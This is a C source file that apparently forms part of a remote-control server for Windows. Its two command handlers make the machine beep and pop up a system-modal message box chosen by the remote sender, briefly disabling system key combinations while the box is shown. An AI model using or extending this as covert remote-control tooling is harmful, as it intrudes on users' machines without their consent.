#include <windows.h>

#include "types.h"
#include "server.h"
#include "misc.h"

// notify commands // bp mx //
int zXcmd_bp(pCommandData X)
{
#define command		X->argv[0]
	unsigned int i,n=3;
	if (X->argc)
	{
		n=_atoi(X->argv[X->argc]);
	}
	i=n;
	while(i--)
	{
		if (chk4break(X))
			return ~0;
		MessageBeep(~0);
	}
	wsprintf(X->sbuf,"*:%s| beeped %u times !",command,n);
	sendStr(X);
	return 0;
}
// zXaddCmd(unsigned int cmd,int (*func)(pCommandData),char *help0,char *help1)
// mx|message|title|icon|type
/*
icon : !,?,i,e; default:none
type : ok,oc,ar,rc,yn,yc
*/
int zXcmd_mx(pCommandData X)
{
#define command		X->argv[0]
#define mx_ok 0x6B6F
#define mx_oc 0x636F
#define mx_ar 0x7261
#define mx_rc 0x6372
#define mx_yn 0x6E79
#define mx_yc 0x6379

	int t;//for SystemParametersInfo(..)
	unsigned long flags;

	if (X->argc)
	{
		if (X->argc>2)
		{
			flags=0;
			switch(X->argv[3][0])
			{
				case '!':
					flags|=MB_ICONEXCLAMATION;
					break;
				case '?':
					flags|=MB_ICONQUESTION;
					break;
				case 'i':
					flags|=MB_ICONINFORMATION;
					break;
				case 'e':
					flags|=MB_ICONERROR;
					break;
			}
			if (X->argc>3)
			{
				switch(*(short int *)(X->argv[4]))
				{
					case mx_ok:
						flags|=MB_OK;
						break;
					case mx_oc:
						flags|=MB_OKCANCEL;
						break;
					case mx_ar:
						flags|=MB_ABORTRETRYIGNORE;
						break;
					case mx_rc:
						flags|=MB_RETRYCANCEL;
						break;
					case mx_yn:
						flags|=MB_YESNO;
						break;
					case mx_yc:
						flags|=MB_YESNOCANCEL;
						break;
				}
			}
		}
		else
			X->argv[2]=X->argv[1]+X->argvlen[1];//X->argv[2] will point to "" if arg2 is absent
		if (chk4break(X))
			return ~0;
		SystemParametersInfo(SPI_SCREENSAVERRUNNING,1,&t,0);
		wsprintf(X->sbuf,"+:%s| displaying message ...",command);sendStr(X);
		flags=MessageBox(GetForegroundWindow(),X->argv[1],X->argv[2],MB_SYSTEMMODAL|MB_TOPMOST|flags);
		SystemParametersInfo(SPI_SCREENSAVERRUNNING,0,&t,0);
		switch(flags)
		{
			case IDOK:
				lstrcpy(X->str,"ok");
				break;
			case IDCANCEL:
				lstrcpy(X->str,"cancel");
				break;
			case IDABORT:
				lstrcpy(X->str,"abort");
				break;
			case IDRETRY:
				lstrcpy(X->str,"retry");
				break;
			case IDIGNORE:
				lstrcpy(X->str,"ignore");
				break;
			case IDYES:
				lstrcpy(X->str,"yes");
				break;
			case IDNO:
				lstrcpy(X->str,"no");
				break;
		}
		wsprintf(X->sbuf,"*:%s| message acknowledged with \"%s\"",command,X->str);
	}
	else
		wsprintf(X->sbuf,"-:%s| message not specified ...",command);
	sendStr(X);
	return 0;
}
